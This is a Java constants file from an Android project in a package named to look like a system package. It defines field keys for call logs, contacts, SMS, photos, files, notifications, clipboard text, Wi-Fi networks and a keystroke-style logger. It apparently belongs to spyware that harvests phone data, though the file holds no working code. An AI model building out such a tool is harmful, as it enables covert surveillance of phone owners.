package oom.android.system.Managers;

public class base {
    public static class CALLS {
        public static final String CALL_TYPE = "type";
        public static final String CALL_PHONE = "phoneNumber";
        public static final String CALL_NAME = "name";
        public static final String CALL_DURATION = "duration";
        public static final String CALL_DATE = "date";
        public static final String CALL_DATEN = "dateN";
    }

    public static class CONTACTS {
        public static final String CONTACT_ID = "raw_id";
        public static final String CONTACT_NAME = "name";
        public static final String CONTACT_PHONE = "phoneNumber";
    }

    public static class IMAGES {
        public static final String IMAGE_ID = "imageId";
        public static final String IMAGE_DISPLAY_NAME = "imageDisplayName";
        public static final String IMAGE_PATH = "imagePath";
        public static final String IMAGE_SIZE = "imageSize";
    }

    public static class BLOCKS {
        public static final String BLOCK_ID = "raw_id";
        public static final String BLOCK_PHONE = "phoneNumber";
        public static final String BLOCK_LIST = "blockList";
    }

    public static class FILES {
        public static final String FILE_NAME= "name";
        public static final String FILE_isDir= "isDir";
        public static final String FILE_PATH= "path";
        public static final String FILE_SIZE= "sizeM";
    }

    public static class SMS {
        public static final String SMS_TYPE= "type";
        public static final String SMS_PHONE= "phoneNumber";
        public static final String SMS_DATE= "date";
        public static final String SMS_PERSON= "person";
        public static final String SMS_MSG= "msg";
        public static final String SMS_LIST= "smsList";
    }

    public static class DOWNLOADS {
        public static final String DOWN_ID = "downId";
        public static final String DOWN_URL = "downUrl";
        public static final String DOWN_TYPE = "downType";
        public static final String DOWN_PATH = "downPath";
        public static final String DOWN_TITLE = "downTitle";
    }

    public static class AudioStreams{
        public final static int STREAM_VOICE_CALL =0;
        public final static int STREAM_SYSTEM =1;
        public final static int STREAM_RING =2;
        public final static int STREAM_MUSIC =3;
        public final static int STREAM_ALARM =4;
        public final static int STREAM_NOTIFICATION =5;
        public final static int STREAM_ACCESSIBILITY =10;
    }

    public static class AudioModes{
        public final static int MODE_NORMAL =0;
        public final static int MODE_RINGTONE =1;
        public final static int MODE_IN_CALL =2;
    }

    public static class AudioEffects{
        public final static int FX_KEY_CLICK =0;
        public final static int FX_FOCUS_NAVIGATION_UP =1;
        public final static int FX_FOCUS_NAVIGATION_DOWN =2;
        public final static int FX_FOCUS_NAVIGATION_LEFT =3;
        public final static int FX_FOCUS_NAVIGATION_RIGHT =4;
        public final static int FX_KEYPRESS_DELETE =7;
        public final static int FX_KEYPRESS_RETURN =8;
        public final static int FX_KEYPRESS_INVALID =9;
    }

    public static class APPS{
        public final static String APPS ="apps";
        public final static String APP_NAME ="appName";
        public final static String PACKAGE_NAME ="packageName";
        public final static String VERSION_NAME ="versionName";
        public final static String VERSION_CODE ="versionCode";
    }

    public static class NOTOFICATIONS{
        public final static String APP_NAME ="appName";
        public final static String TITLE ="title";
        public final static String CONTENT ="content";
        public final static String POST_TIME ="postTime";
        public final static String KEY ="key";
    }

    public static class LOGGER{
        public final static String TIME ="time";
        public final static String TYPE ="type";
        public final static String PACKAGE ="package";
        public final static String TEXT ="text";
    }

    public static class PERMISSION{
        public final static String PERMISSIONS ="permissions";
    }

    public static class CLIPBOARD{
        public final static String TEXT ="text";
    }

    public static class WIFI{
        public final static String BSSID ="BSSID";
        public final static String SSID ="SSID";
        public final static String NETWORKS ="networks";
    }
}
